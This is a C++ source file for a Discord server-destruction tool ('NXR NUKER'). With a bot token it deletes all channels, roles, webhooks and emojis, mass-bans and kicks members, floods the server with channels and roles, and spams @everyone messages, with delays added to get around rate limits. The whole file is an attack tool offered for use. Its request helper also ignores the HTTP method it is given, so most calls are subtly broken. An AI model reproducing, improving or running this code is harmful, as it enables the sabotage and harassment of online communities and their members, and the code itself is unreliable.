#include <windows.h>
#include <wininet.h>
#include <string>
#include <vector>
#include <thread>
#include <atomic>
#include <iostream>
#include <sstream>
#include <chrono>
#include <random>
#include <mutex>
#include <algorithm>
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ws2_32.lib")

std::string g_token;
std::string g_guild;
std::string g_credit = "NXR NUKER";
std::string g_spam_msg = "@everyone SERVER DESTROYED BY NXR";
std::string g_new_server_name = "NXR DESTROYED";
std::string g_channel_prefix = "nxr-nuke-";
std::string g_role_prefix = "NXR-ROLE-";
int g_spam_per_channel = 200;
int g_channels_to_create = 50;
int g_roles_to_create = 30;
std::mutex print_mtx;
std::mt19937 rng{std::random_device{}()};

void log(const std::string& s) {
    std::lock_guard<std::mutex> lk(print_mtx);
    std::cout << s << std::endl;
}

std::string http(const std::string& method, const std::string& endpoint, const std::string& body = "") {
    std::string url = "https://discord.com/api/v10" + endpoint;
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64)", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return "";

    // Open request with proper method
    HINTERNET hConnect = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0,
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_SECURE, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return "";
    }

    std::string headers = "Authorization: Bot " + g_token + "\r\n"
                          "Content-Type: application/json\r\n"
                          "User-Agent: NXR-NUKER/3.0\r\n";

    if (!body.empty()) {
        HttpSendRequestA(hConnect, headers.c_str(), (DWORD)headers.size(), (LPVOID)body.c_str(), (DWORD)body.size());
    } else {
        HttpSendRequestA(hConnect, headers.c_str(), (DWORD)headers.size(), NULL, 0);
    }

    char buf[8192];
    DWORD read = 0;
    std::string resp;
    while (InternetReadFile(hConnect, buf, sizeof(buf) - 1, &read) && read > 0) {
        buf[read] = 0;
        resp += buf;
    }

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    // jitter against rate-limit bots
    std::this_thread::sleep_for(std::chrono::milliseconds(25 + (rng() % 50)));
    return resp;
}

// extract all "id":"...."
std::vector<std::string> extract_ids(const std::string& json) {
    std::vector<std::string> ids;
    size_t pos = 0;
    while ((pos = json.find("\"id\":\"", pos)) != std::string::npos) {
        pos += 6;
        size_t end = json.find("\"", pos);
        if (end != std::string::npos) {
            ids.push_back(json.substr(pos, end - pos));
            pos = end;
        }
    }
    return ids;
}

std::string extract_username(const std::string& json) {
    size_t pos = json.find("\"username\":\"");
    if (pos == std::string::npos) return "unknown";
    pos += 12;
    size_t end = json.find("\"", pos);
    return (end == std::string::npos) ? "unknown" : json.substr(pos, end - pos);
}

// ===================== REAL NUKE FUNCTIONS =====================

void change_server_name() {
    log("[NXR] Changing server name...");
    std::string body = "{\"name\":\"" + g_new_server_name + "\"}";
    http("PATCH", "/guilds/" + g_guild, body);
    log("[NXR] Server name → " + g_new_server_name);
}

void delete_all_channels() {
    log("[NXR] Fetching channels...");
    std::string resp = http("GET", "/guilds/" + g_guild + "/channels");
    auto channels = extract_ids(resp);
    log("[NXR] Deleting " + std::to_string(channels.size()) + " channels...");

    std::vector<std::thread> pool;
    for (auto& id : channels) {
        pool.emplace_back([id]() {
            http("DELETE", "/channels/" + id);
            log("[NXR] Deleted channel " + id);
        });
        if (pool.size() >= 12) {
            for (auto& t : pool) t.join();
            pool.clear();
        }
    }
    for (auto& t : pool) t.join();
    log("[NXR] All channels deleted");
}

void delete_all_roles() {
    log("[NXR] Fetching roles...");
    std::string resp = http("GET", "/guilds/" + g_guild + "/roles");
    auto roles = extract_ids(resp);
    log("[NXR] Deleting roles...");

    for (auto& id : roles) {
        // @everyone role skip
        if (id == g_guild) continue;
        http("DELETE", "/guilds/" + g_guild + "/roles/" + id);
        log("[NXR] Deleted role " + id);
    }
    log("[NXR] Roles cleaned");
}

void delete_all_webhooks() {
    log("[NXR] Fetching channels for webhooks...");
    std::string resp = http("GET", "/guilds/" + g_guild + "/channels");
    auto channels = extract_ids(resp);

    for (auto& ch : channels) {
        std::string wh = http("GET", "/channels/" + ch + "/webhooks");
        auto hooks = extract_ids(wh);
        for (auto& h : hooks) {
            http("DELETE", "/webhooks/" + h);
            log("[NXR] Deleted webhook " + h);
        }
    }
    log("[NXR] Webhooks wiped");
}

void delete_all_emojis() {
    log("[NXR] Fetching emojis...");
    std::string resp = http("GET", "/guilds/" + g_guild + "/emojis");
    auto emojis = extract_ids(resp);
    for (auto& id : emojis) {
        http("DELETE", "/guilds/" + g_guild + "/emojis/" + id);
        log("[NXR] Deleted emoji " + id);
    }
    log("[NXR] Emojis deleted");
}

void mass_ban() {
    log("[NXR] Collecting members (up to 20k+)...");
    std::vector<std::string> members;
    std::string after = "0";

    for (int page = 0; page < 250; ++page) {
        std::string resp = http("GET", "/guilds/" + g_guild + "/members?limit=100&after=" + after);
        auto ids = extract_ids(resp);
        if (ids.empty()) break;
        members.insert(members.end(), ids.begin(), ids.end());
        after = ids.back();
        log("[NXR] Collected " + std::to_string(members.size()) + " members");
        if (ids.size() < 100) break;
    }

    log("[NXR] Starting mass ban on " + std::to_string(members.size()) + " users");
    std::vector<std::thread> pool;

    for (auto& uid : members) {
        pool.emplace_back([uid]() {
            std::string info = http("GET", "/users/" + uid);
            std::string name = extract_username(info);
            std::string body = "{\"delete_message_days\":7,\"reason\":\"" + g_credit + "\"}";
            http("PUT", "/guilds/" + g_guild + "/bans/" + uid, body);
            log("[NXR] BANNED → " + name + " | " + uid);
        });
        if (pool.size() >= 20) {
            for (auto& t : pool) t.join();
            pool.clear();
        }
    }
    for (auto& t : pool) t.join();
    log("[NXR] Mass ban finished");
}

void mass_kick() {
    log("[NXR] Collecting members for kick...");
    std::vector<std::string> members;
    std::string after = "0";
    for (int page = 0; page < 250; ++page) {
        std::string resp = http("GET", "/guilds/" + g_guild + "/members?limit=100&after=" + after);
        auto ids = extract_ids(resp);
        if (ids.empty()) break;
        members.insert(members.end(), ids.begin(), ids.end());
        after = ids.back();
        if (ids.size() < 100) break;
    }

    log("[NXR] Kicking " + std::to_string(members.size()) + " members");
    std::vector<std::thread> pool;
    for (auto& uid : members) {
        pool.emplace_back([uid]() {
            http("DELETE", "/guilds/" + g_guild + "/members/" + uid);
            log("[NXR] KICKED → " + uid);
        });
        if (pool.size() >= 15) {
            for (auto& t : pool) t.join();
            pool.clear();
        }
    }
    for (auto& t : pool) t.join();
    log("[NXR] Mass kick finished");
}

void create_channels() {
    log("[NXR] Creating " + std::to_string(g_channels_to_create) + " channels...");
    std::vector<std::thread> pool;
    for (int i = 0; i < g_channels_to_create; ++i) {
        pool.emplace_back([i]() {
            std::string body = "{\"name\":\"" + g_channel_prefix + std::to_string(i) + "\",\"type\":0}";
            http("POST", "/guilds/" + g_guild + "/channels", body);
            log("[NXR] Created channel " + g_channel_prefix + std::to_string(i));
        });
        if (pool.size() >= 10) {
            for (auto& t : pool) t.join();
            pool.clear();
        }
    }
    for (auto& t : pool) t.join();
}

void create_roles() {
    log("[NXR] Creating " + std::to_string(g_roles_to_create) + " roles...");
    for (int i = 0; i < g_roles_to_create; ++i) {
        std::string body = "{\"name\":\"" + g_role_prefix + std::to_string(i) + "\",\"color\":16711680,\"hoist\":true}";
        http("POST", "/guilds/" + g_guild + "/roles", body);
        log("[NXR] Created role " + g_role_prefix + std::to_string(i));
    }
}

void spam_all_channels() {
    log("[NXR] Fetching channels for spam...");
    std::string resp = http("GET", "/guilds/" + g_guild + "/channels");
    auto channels = extract_ids(resp);
    log("[NXR] Spamming " + std::to_string(channels.size()) + " channels × " + std::to_string(g_spam_per_channel));

    std::vector<std::thread> pool;
    for (auto& ch : channels) {
        pool.emplace_back([ch]() {
            for (int i = 0; i < g_spam_per_channel; ++i) {
                std::string body = "{\"content\":\"" + g_spam_msg + " | " + g_credit + " #" + std::to_string(i+1) + "\"}";
                http("POST", "/channels/" + ch + "/messages", body);
            }
            log("[NXR] 200 spam done on " + ch);
        });
        if (pool.size() >= 15) {
            for (auto& t : pool) t.join();
            pool.clear();
        }
    }
    for (auto& t : pool) t.join();
    log("[NXR] All channel spam finished");
}

void full_nuke() {
    log("[NXR] ========== FULL NUKE STARTED ==========");
    change_server_name();
    std::thread t1(delete_all_channels);
    std::thread t2(delete_all_roles);
    std::thread t3(delete_all_webhooks);
    std::thread t4(delete_all_emojis);
    t1.join(); t2.join(); t3.join(); t4.join();

    std::thread t5(create_channels);
    std::thread t6(create_roles);
    std::thread t7(mass_ban);
    std::thread t8(spam_all_channels);
    t5.join(); t6.join(); t7.join(); t8.join();
    log("[NXR] ========== FULL NUKE COMPLETE ==========");
}

void customize() {
    while (true) {
        std::cout << "\n=== CUSTOMIZE MENU ===\n"
                  << "1. Credit text          [" << g_credit << "]\n"
                  << "2. Spam message         [" << g_spam_msg << "]\n"
                  << "3. New server name      [" << g_new_server_name << "]\n"
                  << "4. Channel prefix       [" << g_channel_prefix << "]\n"
                  << "5. Role prefix          [" << g_role_prefix << "]\n"
                  << "6. Spam per channel     [" << g_spam_per_channel << "]\n"
                  << "7. Channels to create   [" << g_channels_to_create << "]\n"
                  << "8. Roles to create      [" << g_roles_to_create << "]\n"
                  << "0. Back\nChoice: ";
        int c; std::cin >> c; std::cin.ignore();
        if (c == 0) break;
        std::string tmp;
        switch (c) {
            case 1: std::cout << "New credit: "; std::getline(std::cin, g_credit); break;
            case 2: std::cout << "New spam msg: "; std::getline(std::cin, g_spam_msg); break;
            case 3: std::cout << "New server name: "; std::getline(std::cin, g_new_server_name); break;
            case 4: std::cout << "New channel prefix: "; std::getline(std::cin, g_channel_prefix); break;
            case 5: std::cout << "New role prefix: "; std::getline(std::cin, g_role_prefix); break;
            case 6: std::cout << "Spam count: "; std::cin >> g_spam_per_channel; break;
            case 7: std::cout << "Channels to create: "; std::cin >> g_channels_to_create; break;
            case 8: std::cout << "Roles to create: "; std::cin >> g_roles_to_create; break;
        }
    }
}

int main() {
    SetConsoleTitleA("NXR NUKER v3.0 — REAL DESTROYER");
    system("color 0C");
    std::cout << R"(
 ███╗   ██╗██╗  ██╗██████╗     ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
 ████╗  ██║╚██╗██╔╝██╔══██╗    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
 ██╔██╗ ██║ ╚███╔╝ ██████╔╝    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
 ██║╚██╗██║ ██╔██╗ ██╔══██╗    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
 ██║ ╚████║██╔╝ ██╗██║  ██║    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
 ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
               REAL API • FULL OPTIONS • UNLIMITED
)" << std::endl;

    std::cout << "Bot Token : ";
    std::getline(std::cin, g_token);
    std::cout << "Guild ID  : ";
    std::getline(std::cin, g_guild);

    while (true) {
        std::cout << "\n============= NXR NUKER MENU =============\n"
                  << "[ 1] Mass Ban (name + ID show)\n"
                  << "[ 2] Mass Kick\n"
                  << "[ 3] Delete ALL Channels\n"
                  << "[ 4] Delete ALL Roles\n"
                  << "[ 5] Delete ALL Webhooks\n"
                  << "[ 6] Delete ALL Emojis\n"
                  << "[ 7] Create Channels flood\n"
                  << "[ 8] Create Roles flood\n"
                  << "[ 9] Spam ALL Channels (200x parallel)\n"
                  << "[10] Change Server Name\n"
                  << "[11] FULL NUKE (everything)\n"
                  << "[12] Customize all settings\n"
                  << "[ 0] Exit\n"
                  << "Choice: ";
        int choice;
        std::cin >> choice;
        std::cin.ignore();

        switch (choice) {
            case 1: mass_ban(); break;
            case 2: mass_kick(); break;
            case 3: delete_all_channels(); break;
            case 4: delete_all_roles(); break;
            case 5: delete_all_webhooks(); break;
            case 6: delete_all_emojis(); break;
            case 7: create_channels(); break;
            case 8: create_roles(); break;
            case 9: spam_all_channels(); break;
            case 10: change_server_name(); break;
            case 11: full_nuke(); break;
            case 12: customize(); break;
            case 0: return 0;
            default: log("Invalid option");
        }
    }
    return 0;
}
